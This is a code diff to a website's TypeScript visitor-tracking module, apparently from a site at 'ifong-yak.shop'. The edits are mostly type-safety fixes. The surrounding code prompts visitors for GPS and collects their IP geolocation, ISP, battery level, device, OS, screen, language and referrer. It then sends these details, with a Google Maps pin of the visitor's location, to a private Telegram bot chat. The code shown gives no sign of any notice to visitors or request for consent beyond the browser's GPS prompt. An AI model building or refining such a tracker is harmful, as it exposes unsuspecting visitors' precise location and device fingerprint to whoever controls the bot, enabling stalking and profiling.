@@ -15,7 +15,7 @@ export const TELEGRAM_CONFIG = {
   DOMAIN: "www.ifong-yak.shop",
 };
 
-interface IPData {
+export interface IPData {
   ip: string;
   isp: string;
   org: string;
@@ -30,7 +30,7 @@ interface IPData {
 }
 
 function escapeHtml(str: string): string {
-  return str
+  return String(str || "")
     .replace(/&/g, "&amp;")
     .replace(/</g, "&lt;")
     .replace(/>/g, "&gt;");
@@ -44,17 +44,17 @@ async function fetchVisitorIP(): Promise<IPData> {
     const data = await res.json();
     if (data && data.success !== false && data.ip) {
       return {
-        ip: data.ip || "មិនស្គាល់",
-        isp: data.connection?.isp || "មិនស្គាល់",
-        org: data.connection?.org || data.connection?.isp || "មិនស្គាល់",
+        ip: String(data.ip || "មិនស្គាល់"),
+        isp: String(data.connection?.isp || "មិនស្គាល់"),
+        org: String(data.connection?.org || data.connection?.isp || "មិនស្គាល់"),
         as: data.connection?.asn ? `AS${data.connection.asn} ${data.connection.org || ""}`.trim() : "មិនស្គាល់",
-        country: data.country || "មិនស្គាល់",
-        flag: data.flag?.emoji || "🌐",
-        region: data.region || "មិនស្គាល់",
-        city: data.city || "មិនស្គាល់",
-        postal: data.postal || "N/A",
-        lat: data.latitude || 0,
-        lon: data.longitude || 0,
+        country: String(data.country || "មិនស្គាល់"),
+        flag: String(data.flag?.emoji || "🌐"),
+        region: String(data.region || "មិនស្គាល់"),
+        city: String(data.city || "មិនស្គាល់"),
+        postal: String(data.postal || "N/A"),
+        lat: Number(data.latitude) || 0,
+        lon: Number(data.longitude) || 0,
       };
     }
   } catch {
@@ -67,17 +67,17 @@ async function fetchVisitorIP(): Promise<IPData> {
     const data = await res.json();
     if (data && data.ipAddress) {
       return {
-        ip: data.ipAddress,
+        ip: String(data.ipAddress),
         isp: "មិនស្គាល់",
         org: "មិនស្គាល់",
         as: "មិនស្គាល់",
-        country: data.countryName || "មិនស្គាល់",
+        country: String(data.countryName || "មិនស្គាល់"),
         flag: "🌐",
-        region: data.regionName || "មិនស្គាល់",
-        city: data.cityName || "មិនស្គាល់",
-        postal: data.zipCode || "N/A",
-        lat: data.latitude || 0,
-        lon: data.longitude || 0,
+        region: String(data.regionName || "មិនស្គាល់"),
+        city: String(data.cityName || "មិនស្គាល់"),
+        postal: String(data.zipCode || "N/A"),
+        lat: Number(data.latitude) || 0,
+        lon: Number(data.longitude) || 0,
       };
     }
   } catch {
@@ -119,7 +119,7 @@ function requestGPS(timeoutMs = 7000): Promise<GeolocationPosition | null> {
 
 // Device and OS detection
 function getDeviceInfo() {
-  const ua = navigator.userAgent || "";
+  const ua = (typeof navigator !== "undefined" && navigator.userAgent) ? navigator.userAgent : "";
   let deviceType = "💻 Desktop (កុំព្យូទ័រ)";
   if (/iPad|Tablet/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)) {
     deviceType = "📱 Tablet (ថេបប្លែត)";
@@ -180,7 +180,7 @@ function getFormattedDateTime(): string {
 /**
  * Sends visitor notification and native location map pin to Telegram bot
  */
-export async function trackVisitor() {
+export async function trackVisitor(): Promise<void> {
   // Prevent duplicate alert within 2 minutes of the same session
   const lastTracked = sessionStorage.getItem("yak_visitor_last_tracked");
   const nowMs = Date.now();
@@ -193,30 +193,28 @@ export async function trackVisitor() {
     const botToken = TELEGRAM_CONFIG.BOT_TOKEN;
     const targetChatId = TELEGRAM_CONFIG.CHAT_ID;
 
-    // Trigger browser GPS prompt immediately and fetch IP/device in parallel
-    const [gpsPosition, ipInfo, batteryText] = await Promise.all([
-      requestGPS(6000),
-      fetchVisitorIP(),
-      getBatteryStatus(),
-    ]);
+    // Trigger browser GPS prompt and fetch IP / Battery
+    const gpsPosition: GeolocationPosition | null = await requestGPS(6000);
+    const ipInfo: IPData = await fetchVisitorIP();
+    const batteryText: string = await getBatteryStatus();
 
-    const hasGps = gpsPosition && gpsPosition.coords;
-    const finalLat = hasGps ? gpsPosition.coords.latitude : ipInfo.lat;
-    const finalLon = hasGps ? gpsPosition.coords.longitude : ipInfo.lon;
-    const accuracyText = hasGps
+    const hasGps = Boolean(gpsPosition && gpsPosition.coords);
+    const finalLat: number = hasGps && gpsPosition ? gpsPosition.coords.latitude : ipInfo.lat;
+    const finalLon: number = hasGps && gpsPosition ? gpsPosition.coords.longitude : ipInfo.lon;
+    const accuracyText: string = (hasGps && gpsPosition)
       ? `🎯 GPS សុក្រឹតកម្រិតខ្ពស់ (~${Math.round(gpsPosition.coords.accuracy)} ម៉ែត្រ)`
       : `🌐 ប៉ាន់ស្មានតាម Server/បង្គោល ISP (~5-15km)`;
 
     const { deviceType, os, browser } = getDeviceInfo();
-    const isDark = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = typeof window !== "undefined" && window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
     const theme = isDark ? "🌙 Dark Mode (ងងឹត)" : "☀️ Light Mode (ភ្លឺ)";
-    const screenRes = `🖥 ${window.screen.width} × ${window.screen.height}`;
-    const language = `🌐 ${navigator.language || "en-US"}`;
-    const pagePath = window.location.pathname || "/";
-    const referrer = document.referrer ? document.referrer : "ចូលផ្ទាល់ (Direct Visit)";
+    const screenRes = typeof window !== "undefined" ? `🖥 ${window.screen.width} × ${window.screen.height}` : "មិនស្គាល់";
+    const language = typeof navigator !== "undefined" ? `🌐 ${navigator.language || "en-US"}` : "🌐 en-US";
+    const pagePath = typeof window !== "undefined" ? (window.location.pathname || "/") : "/";
+    const referrer = (typeof document !== "undefined" && document.referrer) ? document.referrer : "ចូលផ្ទាល់ (Direct Visit)";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC";
     const datetime = getFormattedDateTime();
-    const domain = window.location.hostname || TELEGRAM_CONFIG.DOMAIN;
+    const domain = (typeof window !== "undefined" && window.location.hostname) ? window.location.hostname : TELEGRAM_CONFIG.DOMAIN;
 
     const mapsUrl = `https://www.google.com/maps?q=${finalLat},${finalLon}`;
 
@@ -254,7 +252,7 @@ export async function trackVisitor() {
       `━━━━━━━━━━━━━━━━━━━━━`,
     ].join("\n");
 
-    // 1. Send the detailed text message (with Google Maps link preview)
+    // 1. Send the detailed text message
     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
